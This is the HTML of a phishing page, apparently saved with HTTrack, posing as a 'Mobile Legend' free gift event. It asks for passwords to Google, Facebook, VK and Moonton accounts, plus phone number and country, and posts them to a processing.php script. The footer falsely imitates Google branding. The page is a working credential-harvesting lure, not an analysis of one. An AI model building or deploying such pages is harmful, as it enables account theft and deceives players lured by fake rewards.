
  <!DOCTYPE html>
<html>
  

<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='img/icon.png' rel='icon' type='image/x-png'/>
<title>Mobile Legend - Free Event</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="ccss/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(img/background.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="Atas.jpg"/>
<input type="submit" class="btn btn-block" style="color: white;background-color: blue;" value="Mobile Legend Gift"> </div>
</div>
<center style="background:white;">

</div>
<center style="background:#FFFFFF;"><br>
<div class="col-md-8">
<h2>
<h2>
</h2>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#F5F5F5;width:100%" class="form-horizontal">
<h4 >

<form action="processing.php" method="POST">

<h4 >
<img src="http://pngimg.com/uploads/google/google_PNG19630.png?i=1" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="google1" placeholder="Email" type="email" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="google2" placeholder="Password" type="password" required>
</div>

<h4 >
<img src="http://www.freepngimg.com/thumb/facebook/2-2-facebook-free-download-png-thumb.png" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb1" placeholder="Email / Number Phone" type="text" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb2" placeholder="Password" type="password" required>
</div>

<h4 >
<img src="https://www.shareicon.net/data/512x512/2015/10/04/111741_vk_512x512.png" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="vk1" placeholder="Email / Number Phone" type="text" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="vk2" placeholder="Password" type="password" required>
</div>


<h4 >
<img src="https://2.bp.blogspot.com/-4hQwrsUFwwg/WkyFCMEk9zI/AAAAAAAABh4/IUGibfWk4WkKmySYg5VKwy-M-qQPiBzIgCLcBGAs/s200/moonton.png" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="mn1" placeholder="Email" type="email" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="mn2" placeholder="Password" type="password" required>
</div>


<h4 >
<img src="https://3.bp.blogspot.com/-IJpVSekzVw8/WGPI7yeAejI/AAAAAAAAAq8/1dDFI-oL5Fghx5GjurUVuSJJ8gkkHjrKACLcB/s1600/logo.png" height="60px" width="110px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="nickname" placeholder="Nickname" type="text" required>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="level">
          <option>Level Account</option>
          <option>Level 1</option>
          <option>Level 2</option>
          <option>Level 3</option>
          <option>Level 4</option>
          <option>Level 5</option>
		  <option>Level 6</option>
		  <option>Level 7</option>
		  <option>Level 8</option>
		  <option>Level 9</option>
		  <option>Level 10</option>
                 <option>Level 11</option>
		 <option>Level 12</option>
		 <option>Level 13</option>
		 <option>Level 14</option>
		 <option>Level 15</option>
		 <option>Level 16</option>
		 <option>Level 17</option>
		 <option>Level 18</option>
		 <option>Level 19</option>
		 <option>Level 20</option>
		 <option>Level 21</option>
		 <option>Level 22</option>
		 <option>Level 23</option>
		 <option>Level 24</option>
		 <option>Level 25</option>
		 <option>Level 26</option>
		 <option>Level 27</option>
		 <option>Level 28</option>
		 <option>Level 29</option>
		 <option>Level 30</option>
        </select>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="login">
          <option>Your Login With</option>
          <option>Google Account</option>
		  <option>Facebook Account</option>
		  <option>VK Account</option>
		  <option>Moonton Account</option>
        </select>
        
        
        </div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="pf">
          <option>PLATFROM</option>
          <option>ANDROID</option>
		  <option>IOS</option>
		  </select>
        
        
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="skin" placeholder="Skin In Your Account" type="number" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="phone" placeholder="Number Phone" type="number" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="country" placeholder="Country" type="text" required>
</div>

<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #0000FF;" id="gsubmit" value="Login Account"> </form>
</div>
</div><br><br>
</div>

</div></div><br>
		  
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>One Google Account for everything Google </p></center>
<img src="http://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/></p>
<p>Copyright &copy; 2017 Google Inc.</p></div>
</body>

</html>